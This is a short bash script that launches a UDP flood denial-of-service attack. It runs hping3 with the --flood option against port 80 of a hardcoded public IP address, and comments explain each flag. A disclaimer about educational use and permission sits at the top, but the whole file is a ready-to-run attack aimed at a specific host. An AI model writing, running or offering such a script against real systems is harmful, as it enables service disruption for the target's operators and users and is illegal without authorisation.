#!/bin/bash

# This script launches a UDP flood attack against a specified target IP address.
# It uses the hping3 tool to send a high volume of UDP packets to port 80,
# simulating a denial-of-service (DoS) attack.
#
# WARNING: This script is for educational and testing purposes only.
# Do not use it against any target without explicit permission.
# Unauthorized attacks are illegal.

# Configured to target your specific server.
TARGET="65.109.132.110"

echo "[*] Starting UDP flood attack on $TARGET..."
# --flood: send packets as fast as possible
# --udp: use UDP protocol
# -p 80: target port 80
sudo hping3 --flood --udp -p 80 $TARGET
